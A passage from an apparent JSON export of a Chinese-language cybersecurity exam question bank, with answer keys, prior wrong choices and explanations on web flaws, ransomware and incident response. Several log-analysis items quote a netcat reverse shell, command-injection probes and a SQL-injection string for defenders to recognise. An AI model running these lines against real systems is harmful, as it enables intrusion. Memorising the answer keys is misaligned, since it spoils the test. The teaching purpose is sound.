(B)錯誤：密碼機制失效通常指加密沒做好、密碼用太弱的演算法，本題與加密無關。 (C)錯誤：注入攻擊（如 SQL Injection）是指在輸入框或網址填入「惡意程式碼或資料庫指令」來欺騙系統。本題只是單純修改帳號名稱，並非填入程式碼。 (D)錯誤：安全日誌與監控失效是指壞人來偷東西時，大樓管理室的監視器壞了或沒人在看。本題考的是網站本身的設計缺陷，而非事後的紀錄與監控。","group_context":null},{"id":"資安題庫B.pdf::20-2-c4d9aa42df7bf377","bank":"B","pdf":"資安題庫B.pdf","qid":"20-2-c4d9aa42df7bf377","page":20,"number":2,"multiple":false,"answers":["A"],"chosen_last":["D"],"stem":"根據常見的弱點類型，下列何種是 Web 應用程式最常見的安全弱點？","options":{"A":"SQL Injection:S QL 注入攻擊","B":"Distributed Denial- Of- Service:D DoS 攻擊","C":"Local File Inclusion: LFI 本地端檔案內容揭露","D":"CrossS ite Request Forgery: CSRF 跨站請求偽造"},"explanation":"雖然近年 OWASP Top 10 的排名有所變動（如「權限控管不當」或 「加密失效」名列前茅），但若在四大選項中比拼傳統且最經典、最具毀滅性、大家最常聽到的 Web 程式碼層級漏洞，SQL Injection 絕對是最具代表性且最常見的安全弱點。","group_context":null},{"id":"資安題庫B.pdf::22-3-4515d7a72eb0996c","bank":"B","pdf":"資安題庫B.pdf","qid":"22-3-4515d7a72eb0996c","page":22,"number":3,"multiple":false,"answers":["C"],"chosen_last":["D"],"stem":"防範 SQL 注入弱點時，下列哪一個觀念最「不」適切，最難有效阻止 SQL 注入？","options":{"A":"使用參數化查詢(PreparedS tatements)","B":"使用正規表示式(Regular Expression)過濾輸入值，限制輸入字元的內容","C":"限制參數的輸入字元長度，將長度控制在 50 個字元以內","D":"採用最小權限原則，並且關閉錯誤訊息，減少攻擊者可獲得的權限和資訊"},"explanation":"(選項 A)是完美徹底根治防禦。(選項 B 與 D)是極佳的輔助防線。 (選項 C)「只限制長度在 50 個字元內」完全無法阻止 SQL 注入。駭客只需要短短十幾個字（例如 1' OR 1=1-- 共 11 個字）就能成功把你的資料庫洗劫一空。","group_context":"某銀行委託資安團隊對金融交易系統進行檢測。資安團隊成功繞過前端 WAF，發現系統可透過「交易金額欄位」進行 SQL 注入。在原始碼檢測時，發現開發人員未使用參數化查詢，而是直接拼接字串 。"},{"id":"資安題庫B.pdf::23-1-338da0fd22715601","bank":"B","pdf":"資安題庫B.pdf","qid":"23-1-338da0fd22715601","page":23,"number":1,"multiple":false,"answers":["C"],"chosen_last":["D"],"stem":"日誌內容裡面的「127.0.0.1;Sleep 5」，最有可能是發生下列哪一種攻擊情境？","options":{"A":"攻擊者想確認該功能是否存在資料庫注入攻擊(SQL Injection)","B":"攻擊者想確認該功能是否存在反序列化攻擊(Insecure Deserialization)","C":"攻擊者想確認該功能是否存在指令注入攻擊(Command Injection)","D":"攻擊者想確認該功能是否存在資安記錄及監控失效(Security Logging and Monitoring Failures)"},"explanation":"日誌中的 ; 是 Linux 系統用來連接兩條指令的符號。本來系統只想跑 ping 127.0.0.1，但駭客利用分號強行在後面拼接了作業系統命令 Sleep 5（讓電腦睡 5 秒）。這種強迫伺服器執行系統命令的漏洞就叫做 「指令注入攻擊（Command Injection）」。就像你對家裡的智慧音箱說： 「幫我播放音樂（原功能）；順便把大門鎖打開（惡意指令拼接）」。音箱沒心機，照著分號前後的命令全部執行了，這就是指令注入。","group_context":"你是一位企業的藍隊防禦專家，今天你忽然收到來自 SOC 的告警，顯示有某個伺服器正在發生異常行為，於是你開始對這個伺服器展開調查，評估是否有發生資安事件。你發現伺服器裡面有一個 ping 的功能，並且在該功能的網頁應用程式日誌裡面出現這內容： 127.0.0.1; Sleep 5 127.0.0.1; whoami 127.0.0.1; /bin/bash - i 2\u003e\u00261 | nc 192.168.99.100 80 \u003e /tmp/tmp.txt"},{"id":"資安題庫B.pdf::24-3-3edce7de4ac5a03b","bank":"B","pdf":"資安題庫B.pdf","qid":"24-3-3edce7de4ac5a03b","page":24,"number":3,"multiple":false,"answers":["C"],"chosen_last":["A"],"stem":"請問「127.0.0.1; /bin/bash -i 2\u003e\u00261 | nc 192.168.99.100 80 \u003e /tmp/tmp.txt」這個日誌的內容，可能代表下列何種攻擊情境？","options":{"A":"攻擊者想勘查 192.168.99.100 的 80port 是否可進行連線，可以連線就可以讀取更多網頁內容","B":"攻擊者想要讀取 /bin/bash 這個檔案內容，並且把結果輸出到 /tmp/tmp.txt 裡面","C":"攻擊者想要透過 nc 進行反向連線，讓 192.168.99.100 這台電腦可以對伺服器輸入指令","D":"攻擊者想要讀取作業系統的版本資訊，並且尋找有無可利用的漏洞直接對作業系統進行攻擊"},"explanation":"這行指令是網路安全考試必考的「反向 Shell（ReverseS hell）」。 駭客在伺服器上執行 /bin/bash -i（啟動互動式終端機），並利用 nc （Netcat 工具）主動連回駭客自己的電腦（192.168.99.100）。這樣一來，外面的駭客就能在不用穿透防火牆的情況下，直接跨海遠端操控這台伺服器。","group_context":"你是一位企業的藍隊防禦專家，今天你忽然收到來自 SOC 的告警，顯示有某個伺服器正在發生異常行為，於是你開始對這個伺服器展開調查，評估是否有發生資安事件。你發現伺服器裡面有一個 ping 的功能，並且在該功能的網頁應用程式日誌裡面出現這內容： 127.0.0.1; Sleep 5 127.0.0.1; whoami 127.0.0.1; /bin/bash - i 2\u003e\u00261 | nc 192.168.99.100 80 \u003e /tmp/tmp.txt"},{"id":"資安題庫B.pdf::26-4-024f9a68e9bdb165","bank":"B","pdf":"資安題庫B.pdf","qid":"26-4-024f9a68e9bdb165","page":26,"number":4,"multiple":false,"answers":["D"],"chosen_last":["C"],"stem":"關於跨網站請求偽造（Cross-Site Request Forgery, CSRF or XSRF）與跨站腳本攻擊（Cross-SiteScripting, XSS）的比較，下列敘述何者較正確？","options":{"A":"兩者都是利用瀏覽器（Browser ）對伺服器端（ServerSite）的信任","B":"兩者都是利用伺服器端（ServerSite）對瀏覽器（Browser ）的信任","C":"XSS 是利用伺服器端（ServerSite）對瀏覽器（Browser ）的信任，CSRF 是利用瀏覽器（Browser ）對伺服器端（ServerSite）的信任","D":"CSRF 是利用伺服器端（ServerS ite）對瀏覽器（Browser）的信任，XSS 是利用瀏覽器（Browser ）對伺服器端（ServerSite）的信任"},"explanation":" CSRF（偽造請求）：伺服器看到請求上貼著正確的 Cookie，就盲目信任這個請求是使用者本人發出的（伺服器信任瀏覽器身分），結果不知道使用者是在不知情下被第三方惡意網站操控。  XSS（惡意腳本）：使用者的瀏覽器盲目信任從這個網站伺服器傳回來的網頁代碼（瀏覽器信任伺服器內容），結果沒發現網頁裡已經被混入了駭客的惡意腳本。","group_context":null},{"id":"資安題庫B.pdf::28-1-b74889d60cfc8f7d","bank":"B","pdf":"資安題庫B.pdf","qid":"28-1-b74889d60cfc8f7d","page":28,"number":1,"multiple":false,"answers":["D"],"chosen_last":["C"],"stem":"關於跨站請求偽造（Cross -Site Request Forgery, CSRF 或 XSRF） 的防禦方式，下列何者「不」適用？","options":{"A":"檢查請求(Request)的來源位址( 驗證 HTTP Referer)","B":"在 Server Site 產生 token，存在 Server 的 session 中","C":"使用圖型驗證碼","D":"Prepared Statement"},"explanation":"CSRF（跨站請求偽造）。小偷沒你的密碼，但他做了一個惡意網頁，你點了之後，瀏覽器會帶著你「已經登入的銀行 Cookie」，悄悄幫你執行「轉帳給小偷」的指令。 • 防禦的方法：檢查從哪裡飛過來的（A, Referer）、要求對暗號（ B, CSRF Token）、或者（C ）要你動手輸入圖片密碼證明是本人在操作。 • (D)Prepared Statement 是用來防範 SQL Injection。","group_context":null},{"id":"資安題庫B.pdf::31-3-aa6f83c32dcf8273","bank":"B","pdf":"資安題庫B.pdf","qid":"31-3-aa6f83c32dcf8273","page":31,"number":3,"multiple":false,"answers":["C"],"chosen_last":["A"],"stem":"某資安管理人員發現企業網路中爆發惡意軟體，該人員使用專門的惡意軟體分析工具從三個不同的系統中截取到惡意程式的樣本，並注意到惡意程式碼每次感染時均會略有變動，因此公司的防毒軟體無法盡早發現，請問這家公司感染了下列何者類型的惡意程式？","options":{"A":"Multipartite Virus","B":"Encrypted Virus","C":"Polymorphic Virus","D":"Stealth Virus"},"explanation":"這隻病毒每次出門傳染別人都會「換一張臉、改一下穿搭」（程式碼略有變動）。防毒軟體如果只靠記住長相（特徵碼）去抓人，根本認不出來。這種會自我變形的病毒就叫做 Polymorphic（多形性 /變形）病毒。","group_context":null},{"id":"資安題庫B.pdf::32-6-703e2706f301f336","bank":"B","pdf":"資安題庫B.pdf","qid":"32-6-703e2706f301f336","page":32,"number":6,"multiple":false,"answers":["D"],"chosen_last":["B"],"stem":"就勒索軟體事件而言，最有可能降低事件衝擊的控制措施為下列何項？（重複考過）","options":{"A":"原始碼檢測","B":"日誌分析","C":"社交工程演練","D":"離線資料備份"},"explanation":"房子如果被勒索軟體放火燒了（檔案全被加密），做再多安全檢查、 事後抓兇手都無法阻止房子已經燒掉的事實。唯一能讓你起死回生的，就是你在遠處還有一個一模一樣的「備用倉庫」（離線資料備份），直接拿出來用，衝擊降到最低！","group_context":null},{"id":"資安題庫B.pdf::32-7-57856c4665f9a812","bank":"B","pdf":"資安題庫B.pdf","qid":"32-7-57856c4665f9a812","page":32,"number":7,"multiple":false,"answers":["A"],"chosen_last":["D"],"stem":"美國國家安全局 NSA 的永恆之藍（EternalBlue）漏洞利用程式及 WannaCry 勒索病毒之攻擊手法，至今仍有攻擊事件，其主要是利用下列何者？","options":{"A":"Windows SMB 漏洞（MS17-010）","B":"POODLE 漏洞（Padding Oracle On Downgraded Legacy Encryption ）","C":"零時差漏洞攻擊（Zero -day attack）","D":"微軟 Office 記憶體毀損漏洞（CVE- 2017-11882）"},"explanation":"當年震驚全球的 WannaCry 勒索軟體，就是利用微軟 Windows 系統裡用來分享檔案的「SMB 檔案共享協定」大漏洞（代號 MS17- 010）。這就像大樓的鐵捲門有一個全天下都知道的通訊漏洞，駭客不用鑰匙就能直接滑進去。","group_context":null},{"id":"資安題庫B.pdf::33-12-b0f3a526363e4367","bank":"B","pdf":"資安題庫B.pdf","qid":"33-12-b0f3a526363e4367","page":33,"number":12,"multiple":false,"answers":["C"],"chosen_last":["D"],"stem":"勒索軟體與資料外洩攻擊之準備、預防、緩解與應變之實務上，可透過調校與強化主機系統其網路服務設定來降低所暴露之弱點。下列何種系統強化措施最「不」合適？","options":{"A":"於面向網際網路之主機執行弱點掃描以識別系統弱點並修復","B":"於主機系統停用並關閉未使用 RDP 遠端桌面協定 TCP/3389 連接埠","C":"於主機系統啟用 SMBv1,SMBv2 伺服器訊息區協定以達成傳輸加密","D":"於防火牆設定阻擋 TCP/445 連接埠對網際網路之內外連線規則"},"explanation":"SMBv1 是引發 WannaCry 世紀災難的大漏洞來源！要加密、要安全， 應該是徹底關閉 SMBv1，而不是去啟用它。","group_context":null},{"id":"資安題庫B.pdf::35-2-ac243c9242e32285","bank":"B","pdf":"資安題庫B.pdf","qid":"35-2-ac243c9242e32285","page":35,"number":2,"multiple":false,"answers":["C"],"chosen_last":["A"],"stem":"駭客勒索集團會利用網路釣魚方式，達成加密勒索目的，讓公司蒙受重大損失。身為公司資安人員，必須全面瞭解掌握各類駭客釣魚的方式，才能對公司高層提出有效防護對策。關於常見之駭客釣魚方式，下列敘述何者正確？","options":{"A":"鯨釣(Whaling)：針對特定人員、公司、組織的發送，目標為釣取特定人員機敏資料或於其電腦植入木馬","B":"魚叉式釣魚(Spear Phishing)：瞄準大型公司、重要人物發送特定釣魚郵件的攻擊","C":"複製型釣魚(Clone Phishing)：攻擊者使用某些方法密切監視受害者收件匣。攻擊者會接收受害者近期電子郵件最好有連結或附件並進行複製偽造","D":"語音釣魚(Voice Phishing)：或稱 vishing 會假冒為受害者信任的個人或單位，利用語音通話與各種話術，試圖從受害者取得各種機敏資訊，只限記在電話詐騙，不會使用在電子郵件中"},"explanation":"(A)是 「魚叉式釣魚」（瞄準特定目標）。 (B)是「鯨釣」（ 目標是重要大人物）。(D) 錯在「只限記在電話詐騙」，現代詐騙常常是語音與郵件互相搭配。","group_context":"勒索病毒(Ransomware) 成為企業政府頭疼的資安問題，在面對新穎勒索病毒與散布方式，並無百分百對策。上層長官要求提出針對勒索病毒防護的安全架構規劃，常見就是防毒系統更新建置為其中一個對策。"},{"id":"資安題庫B.pdf::38-1-08a2e0159a46c91d","bank":"B","pdf":"資安題庫B.pdf","qid":"38-1-08a2e0159a46c91d","page":38,"number":1,"multiple":false,"answers":["C"],"chosen_last":["D"],"stem":"關於 OWASP (Cyber Defense Matrix, CDM)網路防禦矩陣基本結構的敘述，下列何者錯誤？","options":{"A":"網路防禦矩陣 (Cyber Defense Matrix, CDM)可協助企業的整體資安綜合防護評估更有邏輯與結構","B":"矩陣基本結構可區分為 NIST 網路安全框架 (Cyber security Framework, CSF)的五個功能以及以資產類別為主的兩個維度","C":"NIST 網路安全框架 (Cyber security Framework, CSF)之框架核心 (Framework Core)的五個功能維度包含識別 (Identify)、保護 (Protect)、偵測 (Detect)、回應 (Respond)與資產管理 (Asset Management)","D":"資產類別維度包含設備 (Devices)、應用程式 (Application)、網路 (Network)、資料 (Data)與人員(User)"},"explanation":"NIST CSF 的五大核心功能是：識別 (Identify)、保護 (Protect)、 偵測 (Detect)、回應 (Respond)、復原 (Recover)。( 選項 C)用「資產管理」換掉了「復原 (Recover)」。","group_context":null},{"id":"資安題庫B.pdf::39-1-1078b629d0478bdc","bank":"B","pdf":"資安題庫B.pdf","qid":"39-1-1078b629d0478bdc","page":39,"number":1,"multiple":false,"answers":["D"],"chosen_last":["C"],"stem":"請問下列何項防禦改善措施跟本次事件的起因「較無直接關聯」？","options":{"A":"定期對員工進行教育訓練及案例說明，提升員工的資安意識，降低員工點擊釣魚信件的機率","B":"確保每一台端點都安裝防毒軟體與 EDR 軟體並且定期更新，提升端點設備對抗惡意程式的能力","C":"定期確認郵件閘道伺服器 (Mail Gateway)阻擋釣魚信件的防護能力","D":"定期對公司官網做弱點掃描、源碼檢測、滲透測試"},"explanation":"員工訓練 (A)、補強端點防毒/EDR (B) 、檢查郵件過濾網關 (C)都是對症下藥。而 (D)檢查公司外網官網有沒有漏洞 ，雖然對公司安全很重要，但跟這次「員工個人點信中毒」的事件起因完全沒有因果關係。","group_context":"同仁點擊釣魚信件 ➡郵件網關 (Mail Gateway)沒攔截 ➡筆電防毒沒更新 ➡筆電變跳板 ➡駭客在內部橫向移動 (Lateral Movement)➡核心系統與機敏資料被控制。"},{"id":"資安題庫B.pdf::39-2-c642cdc97e47a438","bank":"B","pdf":"資安題庫B.pdf","qid":"39-2-c642cdc97e47a438","page":39,"number":2,"multiple":false,"answers":["C"],"chosen_last":["D"],"stem":"2016 年美國銀行當時的首席安全科學家 Sounil Yu 提出了 OWASP CDM (Cyber Defense Matrix)，希望幫助企業盤點目前的防禦機制，並且把盤點結果對應到 NIST CSF 五大類別以及五種企業資產類別。你的主管請你運用 OWASP CDM 的觀念來盤點目前的防禦機制，請問關於 OWASP CDM 描述，下列何者「錯誤」？","options":{"A":"OWASP CDM 的縱軸有五個項目，由上到下包含設備 (Devices)、應用程式 (Application)、網路 (Network)、資料 (Data)與人員 (User)","B":"OWASP CDM 的橫軸有五個項目，由左到右包含識別 (Identify)、保護 (Protect)、偵測 (Detect)、回應 (Respond)、復原 (Recover)","C":"在這個 5 乘 5 的矩陣中，橫軸下方有一個區域標示了依賴程度，依賴程度有三個考量因素，包含科技 (Technology)、人員 (People)、流程與治理 (Process/Govern)，其中對於科技 (Technology)的依賴程度由左至右是越來越高，對於人員 (People)的依賴程度由左至右是越來越低","D":"OWASP CDM 主要用來分類資安產品與對應防禦機制，無法用來分析漏洞成因"},"explanation":"在 OWASP CDM 矩陣中，隨著橫軸由左往右（從「識別、保護」走到 「回應、復原」）： 左邊（預防階段）： 可以高度依賴自動化科技 (Technology)去擋、去掃描。右邊（被打穿、要緊急應變與收拾）：科技防毒通常已經失效了，這時必須高度依賴人員 (People)的危機處理智慧與經驗、按照流程 (Process)來拯救公司。所以，由左至右，對科技的依賴是「越來越低」，對人員的依賴是「越來越高」。( 選項 C)講反了。","group_context":"同仁點擊釣魚信件 ➡郵件網關 (Mail Gateway)沒攔截 ➡筆電防毒沒更新 ➡筆電變跳板 ➡駭客在內部橫向移動 (Lateral Movement)➡核心系統與機敏資料被控制。"},{"id":"資安題庫B.pdf::42-3-069e451dfc2458df","bank":"B","pdf":"資安題庫B.pdf","qid":"42-3-069e451dfc2458df","page":42,"number":3,"multiple":false,"answers":["B"],"chosen_last":["A"],"stem":"某公司正在研究網路型防火牆（Layer 4 Firewall）如何有效防止網站應用程式（Web application ）攻擊的方法，下列敘述何者正確？","options":{"A":"網路型防火牆可以偵測惡意的網站訪問攻擊","B":"網路型防火牆無法阻擋此類型攻擊，因為連接埠 80,443 必須開啟","C":"如果正確設定，網路型防火牆可阻擋此類型攻擊","D":"無須進行設定，網路型防火牆預設能阻擋此類型攻擊"},"explanation":"Layer 4 網路型防火牆是一個傳統門衛，他只看「你找哪一樓（Port 號）」。因為網站應用程式攻擊（如 SQL 注入）都是假裝成正常客人，走大樓對外開放的 80 或 443 號大門（HTTP/HTTPS） 進來的。傳統門衛因為一定要開這兩個大門讓客人進來，他又看不懂客人口袋裡裝的惡意信件內容（它是第四層，看不懂第七層的應用程式內容），所以他完全無法阻擋這種網站應用程式攻擊。這必須靠 WAF（網站應用程式防火牆）才擋得住。","group_context":null},{"id":"資安題庫B.pdf::43-4-27cf5f445417e2a3","bank":"B","pdf":"資安題庫B.pdf","qid":"43-4-27cf5f445417e2a3","page":43,"number":4,"multiple":false,"answers":["C"],"chosen_last":["D"],"stem":"針對目前時下常見的資安技術與產品中，下列何項描述較「不」正確？","options":{"A":"Breach and Attack Simulation（BAS）主要是用高頻率且大量的攻擊方式來檢驗企業當下的防禦機制是否有效","B":"External Attack Surface Management（EASM ）主要用來查核企業暴露於網路上的數位資產有哪些，例如對外開放的 port、企業持有的網域名稱、企業外洩的帳號密碼等等","C":"Security Information and Event Management（SIEM）僅用來蒐集外部常見的攻擊情資，例如其他國家或企業的攻擊事件，或是暗網上的攻擊行動預告文章，以便發現潛在的資安威脅，然後再來檢視企業是否即將面臨類似的攻擊","D":"Endpoint Detection and Response（EDR ）主要是透過分析端點的日誌和行為，來發現甚至阻斷攻擊者的行動"},"explanation":"SIEM（安全性資訊與事件管理）的核心功能是把「我們家自己公司內部」所有防火牆、防毒、伺服器的日誌（Log ）全部收上來進行大數據關聯分析。(選項 C)「僅用來蒐集外部常見的攻擊情資（如暗網預告）」，這完全講錯了。那是「威脅情資（Threat Intelligence ）」在做的事，SIEM 是對內的日誌大管家。","group_context":null},{"id":"資安題庫B.pdf::45-3-9030a02d4e79ecf6","bank":"B","pdf":"資安題庫B.pdf","qid":"45-3-9030a02d4e79ecf6","page":45,"number":3,"multiple":false,"answers":["C"],"chosen_last":["B"],"stem":"面對組織化、多變化的駭客攻擊，建立資訊安全監控維運中心 (Security Operation Center,S OC)以加強資訊安全系統安全，下列何者是 SOC 的較主要運作功能？","options":{"A":"決定風險處理方法","B":"進行資安弱點管理","C":"即時監看資安事件","D":"處理資安事故原因"},"explanation":"SOC（資安監控中心）就像是科學園區或大型大樓的中央監控電視牆主控室。坐在裡面的保全人員，最重要的核心工作就是「 24 小時盯著電視牆（即時監看全公司的資安告警事件）」，一看到亮紅燈，立刻分派人員去現場處理。","group_context":null},{"id":"資安題庫B.pdf::48-2-c9906a6caa27dabb","bank":"B","pdf":"資安題庫B.pdf","qid":"48-2-c9906a6caa27dabb","page":48,"number":2,"multiple":false,"answers":["C"],"chosen_last":["D"],"stem":"事件發生於凌晨，內部 SOC 尚未全面值班。若企業希望兼顧即時應變與人力配置的合理性，依情境設計，下列何種安排最「不」適當？","options":{"A":"透過自動化工具先行進行風險阻斷","B":"結合 XDR 的事件可視性，並由 MDR 提供即時分析與回應","C":"由 SOC 於上班時間統一處理所有事件","D":"暫時限制所有非上班時間的系統操作"},"explanation":"凌晨有駭客在亂搞(選項 C)等到白天內部 SOC 上班才統一處理，等天亮時公司所有的主機早就被勒索軟體鎖光、直接破產了，這是最不適當的安排！半夜沒人時，應該要靠自動化工具先防堵(選項 A)，或是靠合約買的外部 24 小時值班夜間保全（MDR 服務商，選項 B）幫忙即時滅火。","group_context":"超好用軟體企業為提升整體資安防護能力，已在使用者端點全面部署 EDR（Endpoint Detection and Response），並於核心網路與重要系統區段導入 NDR（Network Detection and Response）。企業同時建置 XDR（Extended Detection and Response ）平台，將未來來自端點、網路與身分相關的安全事件集中分析。在營運安排上，企業於上班時段由內部 SOC 團隊負責資安監控與事件處置，並在夜間與假日委由外部 MDR（ Managed Detection and Response）服務商提供 24x7 的即時監控與回應支援。 今日災情：某日凌晨（非上班時間），一名員工帳號登入企業環境。隨後，該帳號所使用的裝置開始執行不常見的系統指令，並在短時間內嘗試連線至多個內部系統。這些行為本身尚未造成服務中斷，但其活動模式橫跨端點行為、帳號使用與內部網路連線，與正常業務行為存在明顯差異。"},{"id":"資安題庫B.pdf::48-3-724ddafddf14f303","bank":"B","pdf":"資安題庫B.pdf","qid":"48-3-724ddafddf14f303","page":48,"number":3,"multiple":false,"answers":["A"],"chosen_last":["B"],"stem":"凌晨，一台置於公司內未關閉的筆電出現異常行為，但尚未觀察到明顯的內部網路連線異動。該裝置持續產生不尋常的程序啟動、記憶體注入行為，並嘗試修改系統設定。若希望快速確認端點是否已遭入侵，並即時降低風險，下列何項設計最「無法」帶來實質效益？","options":{"A":"透過 NDR 觀察是否存在異常網路通訊","B":"由 SOC 逐一檢查系統日誌","C":"將事件送交 XDR 進行跨來源關聯分析","D":"以 EDR 的端點行為分析與即時回應功能作為主要處置手段"},"explanation":"題目指出目前「尚未觀察到明顯的內部網路連線異動」，所有的壞事 （記憶體注入、修改系統設定）都只發生在「這台筆電內部（端點）」。 既然網路根本沒有動靜，你這時候去用 NDR（網路流量分析， A 錯誤） 盯著網路線看，是絕對抓不到任何東西、也最無法帶來效益的。這時候必須全權依賴這台電腦裡的特務 EDR( 選項 D)直接進行阻斷。","group_context":"超好用軟體企業為提升整體資安防護能力，已在使用者端點全面部署 EDR（Endpoint Detection and Response），並於核心網路與重要系統區段導入 NDR（Network Detection and Response）。企業同時建置 XDR（Extended Detection and Response ）平台，將未來來自端點、網路與身分相關的安全事件集中分析。在營運安排上，企業於上班時段由內部 SOC 團隊負責資安監控與事件處置，並在夜間與假日委由外部 MDR（ Managed Detection and Response）服務商提供 24x7 的即時監控與回應支援。 今日災情：某日凌晨（非上班時間），一名員工帳號登入企業環境。隨後，該帳號所使用的裝置開始執行不常見的系統指令，並在短時間內嘗試連線至多個內部系統。這些行為本身尚未造成服務中斷，但其活動模式橫跨端點行為、帳號使用與內部網路連線，與正常業務行為存在明顯差異。"},{"id":"資安題庫B.pdf::51-2-c8a29f1a67fd811f","bank":"B","pdf":"資安題庫B.pdf","qid":"51-2-c8a29f1a67fd811f","page":51,"number":2,"multiple":false,"answers":["D"],"chosen_last":["B"],"stem":"關於資安事件(Event)與資安事故(Incident)留存紀錄，下列敘述何者較「不」正確？","options":{"A":"事件與事故都可以進行趨勢分析","B":"發生資安事故時，資安事件可協助分析與處置","C":"都可作為符合法規之證據","D":"資安事故才須留紀錄，資安事件無需留存，以節省成本"},"explanation":"雖然日常的「事件 (Event)」很細瑣，但卻是找出事故原因的蛛絲馬跡，絕對不能為了省成本就完全不記錄。如果不錄平常的畫面，你怎麼知道小偷前幾天是不是有來假裝外送員探路？","group_context":null},{"id":"資安題庫B.pdf::52-2-820fa5b997076979","bank":"B","pdf":"資安題庫B.pdf","qid":"52-2-820fa5b997076979","page":52,"number":2,"multiple":false,"answers":["C"],"chosen_last":["B"],"stem":"關於 NISTS P 800-61 資安事故處理指引，其事故處置生命週期，而控制、清除與復原（Containment, Eradication \u0026 Recovery）中最常被用於識別來源攻擊主機之方法，下列哪一項最「不」正確？","options":{"A":"驗證來源攻擊主機是否偽造 IP 位置（IP Address）","B":"使用搜尋引擎（Search Engine）調查來源攻擊主機","C":"以服務阻斷攻擊（Deny of Service）觀察來源攻擊主機反應","D":"觀察攻擊者所可能使用的通信管道（Communication Channels ）"},"explanation":"被駭客打的時候，我們可以查他的 IP(A)、去 Google 搜他的黑歷史 (B)、看他用什麼通道傳資料 (D)。但我們絕對不能用「發動 DDoS 駭客手段反擊回去 (C)」，這是違法且極不專業的報復行為。","group_context":null},{"id":"資安題庫B.pdf::55-2-aa0998b9bce4010e","bank":"B","pdf":"資安題庫B.pdf","qid":"55-2-aa0998b9bce4010e","page":55,"number":2,"multiple":false,"answers":["B"],"chosen_last":["D"],"stem":"各地區/ 領域之電腦緊急應變小組（Computer Emergency Response Team, CERT）與電腦資安事件應變小組（Computer Security Incident Response Team, CSIRT），常透過紅綠燈協定（Traffic Light Protocol, TLP）來促進敏感資訊如威脅情資之分享與有效協作，關於紅綠燈協定之敘述，下列何者「最不正確」？","options":{"A":"TLP:RED 僅供收件者本人查閱或聆聽，不得進一步揭露","B":"TLP:AMBER 收件者僅於組織內使用，且任何狀況都不得對客戶散播","C":"TLP:GREEN 收件者可於相關事件的特定社群中散播資訊","D":"TLP:CLEAR 收件者可以將此類資訊散播至任何地方，對揭露沒有限制"},"explanation":"(選項 B )寫到極端的「任何狀況都不得對客戶散播」是不正確的。","group_context":null},{"id":"資安題庫B.pdf::58-6-94dae893b74a1ba3","bank":"B","pdf":"資安題庫B.pdf","qid":"58-6-94dae893b74a1ba3","page":58,"number":6,"multiple":false,"answers":["B"],"chosen_last":["D"],"stem":"某日 A 公司內部資安人員收到一則漏洞資安通報資訊如附圖，關於內容中通用漏洞評分系統（Common VulnerabilityS coringSystem, CVSS），下列敘述何者「不」正確？ (附圖：CVE -2019-17781 Detail, BaseS core: 9.8 CRITICAL, Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)","options":{"A":"CVSS 的分數愈高，代表這個漏洞的嚴重等級愈高","B":"CVSS 評分基準中，會考量這個漏洞已被公開的天數","C":"CVSS 的評分基準中，會考量這個漏洞或弱點在使用時，所需擁有的權限等級 （Privileges Required）","D":"CVSS 的分數滿分為 10 分"},"explanation":"CVSS 的「基本指標群（BaseS core）」評估的是漏洞本質上的固有屬性（如滿分 10 分(D) 、分數越高越嚴重(A)、需不需要權限 PR(C)）。它不會因為這個漏洞公開了 10 天或 100 天，就去改變基本分數。","group_context":null},{"id":"資安題庫B.pdf::60-1-6b7d7d4e42897f43","bank":"B","pdf":"資安題庫B.pdf","qid":"60-1-6b7d7d4e42897f43","page":60,"number":1,"multiple":false,"answers":["D"],"chosen_last":["B"],"stem":"關於弱點掃描（Vulnerability Assessment ）的描述，下列敘述何者不正確？","options":{"A":"弱點掃描屬於一種網路探測技術","B":"弱點掃描主要是偵測並掃描位於主機上的各個端口或節點的弱點資訊後，與自身的弱點資料庫進行比對","C":"若防火牆和入侵偵測系統是屬於被動的防禦方法，則弱點掃描就屬於一種主動的防禦方法","D":"弱點掃描與原碼檢測(Source Code Analysis) 應擇一使用，以避免檢測資料相互干擾"},"explanation":"在資安防禦中，弱點掃描（從外部或系統面找漏洞）與原碼檢測（從程式碼內部看排版和邏輯缺陷）是相輔相成、缺一不可的，必須搭配使用，沒有「互相干擾只能擇一」的說法。","group_context":null},{"id":"資安題庫B.pdf::60-2-c6dfbe104a0a481b","bank":"B","pdf":"資安題庫B.pdf","qid":"60-2-c6dfbe104a0a481b","page":60,"number":2,"multiple":false,"answers":["D"],"chosen_last":["B"],"stem":"在網站平台開發時弱點管理的範疇中時常需要進行源碼檢測、弱點掃描、滲透測試；源碼檢測目的是透過對原始碼的檢查，挖掘已知或未知的網頁問題，而進行弱點掃描的目的為何？","options":{"A":"驗證已知弱點的可行性","B":"以駭客或惡意使用者的角度對目標進行驗證","C":"檢測程式中的商業邏輯問題","D":"檢測在環境與系統上的錯誤"},"explanation":" 源碼檢測：看原始碼，找程式設計層面的問題。  弱點掃描：看環境與系統配置，找已知漏洞、錯誤設定、過時版本等問題 。  滲透測試：從攻擊者角度嘗試利用弱點，驗證是否真的能被入侵 。","group_context":null},{"id":"資安題庫B.pdf::60-3-2a33fa06ac9a4b11","bank":"B","pdf":"資安題庫B.pdf","qid":"60-3-2a33fa06ac9a4b11","page":60,"number":3,"multiple":false,"answers":["C"],"chosen_last":["D"],"stem":"下列何者是資安人員常用來找出作業系統漏洞的工具？","options":{"A":"ping","B":"scapy","C":"OpenVAS","D":"MBSD"},"explanation":"OpenVAS（開放通用漏洞評估系統）是著名的開源漏洞掃描器，專門用來掃描作業系統和網路設備的漏洞。ping 用來測試網路連不連得通。 Scapy 是 Python 網路封包分析與製作工具。","group_context":null},{"id":"資安題庫B.pdf::62-5-7643479632318cff","bank":"B","pdf":"資安題庫B.pdf","qid":"62-5-7643479632318cff","page":62,"number":5,"multiple":false,"answers":["B"],"chosen_last":["D"],"stem":"下列的弱點應對修補方式，何者較「不」適當？","options":{"A":"緩衝區溢位要用記憶體防護(DEP)","B":"遠端執行安全漏洞(RCE) 可以透過防火牆阻擋","C":"Command Injection 用過濾方式即可防護","D":"Resource Injection 可以用白名單方式過濾"},"explanation":"DEP（ Data Execution Prevention，資料執行防止）防止攻擊者將惡意程式碼放入記憶體後直接執行。攻擊者利用 Buffer Overflow：輸入過長資料\u003e 覆蓋記憶體\u003e 插入惡意 Shellcode\u003e取得控制權。DEP 可以阻止： 在不可執行的記憶體區域執行程式碼，因此是緩衝區溢位的重要防護手段之一。 • (B 選項錯誤)RCE（Remote Code Execution）攻擊者可以：遠端執行指令、執行惡意程式、控制伺服器。防火牆不是修補 RCE 漏洞的方法，若攻擊走合法通道如 